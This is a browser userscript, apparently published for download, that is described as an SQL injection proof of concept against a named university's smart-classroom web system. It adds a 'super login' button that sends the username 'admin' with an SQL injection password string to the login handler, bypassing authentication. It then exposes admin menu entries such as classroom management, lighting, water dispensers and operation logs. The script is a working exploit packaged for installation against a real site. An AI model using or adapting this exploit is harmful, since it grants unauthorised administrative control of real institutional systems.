// ==UserScript==
// @name         "智慧"教室
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  SQL injection PoC
// @author       wowIamSoHandsome
// @match        http://classroom.scau.edu.cn/zhjs_new/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/422982/%22%E6%99%BA%E6%85%A7%22%E6%95%99%E5%AE%A4.user.js
// @updateURL https://update.greasyfork.org/scripts/422982/%22%E6%99%BA%E6%85%A7%22%E6%95%99%E5%AE%A4.meta.js
// ==/UserScript==

(function() {
    'use strict';


    var button="<button id=\"wow\">超级登录！</button>";
    $(".xiugai").find("tbody").append(button);
    $("#wow").click(
    function (){

                $.ajax({
                    url: "ashx/bind_user_information.ashx",
                    type: "post",
                    async: false,
                    data: { accountno: "admin", bs:1,pwd: "YouCanPutAnythingHere' or 1=(1) --"},
                    dataType: "text",
                    traditional: true,
                    success: function (data) {
                        if (data == "-9") {
                            location.href = "person_center.aspx";
                        } else {
                            var _key = data.split(":")[0];
                            var _value = data.split(":")[1];
                         location.href = "index.aspx";

                        }

                    },
                    error: function (msg) {
                        return false;
                    }
                });
            }

    )
    var html = "";

    html += "<tr>";
                                html += '<td><a href="notice.aspx"><img src="img/roz.png"/><br />通知</a></td>';
                                html += '<td><a href="classroom_management.aspx"><img src="img/room.png"/><br />教室管理</a></td>';
                                html += '</tr>';
                                html += '<tr>';
                                html += '<td><a href="water.aspx"><img src="img/roz.png"/><br />饮水机管理</a></td>';
                                html += '<td><a href="pub_light.aspx"><img src="img/roz.png"/><br />公共照明</a></td>';
                                //html += '<td><a href="scan_code_class.aspx"><img src="img/som.png"/><br />扫码上课</a></td>';
                                html += '</tr>';
                                html += '<tr>';
                                html += '<td><a href="data_analysis.aspx"><img src="img/tongji.png"/><br />数据分析</a></td>';
                                html += '<td><a href="query_zixi.aspx"><img src="img/roz.png"/><br />自习课室查询</a></td>';
                                html += '</tr>';
                                html += '<tr>';
                                html += '<td><a href="query_log.aspx"><img src="img/roz.png"/><br />操作日志</a></td>';
                                html += '<td><a href="query_jsbj.aspx"><img src="img/roz.png"/><br />教室报警</a></td>';
                                html += '</tr>';
                                html += '<tr>';
                                html += '<td  onclick="tc()"><a href="javascript:" ><img src="img/roz.png"/><br />退出</a></td>';
                                html += '<td></td>';
                                html += '</tr>';
    $(".menutable").html(html);
    var color=["red","green","blue"];
    var index=0;
    setInterval(function(){
    $("#wow").css("background",color[index%3]);
        index++;
    }, 50);


})();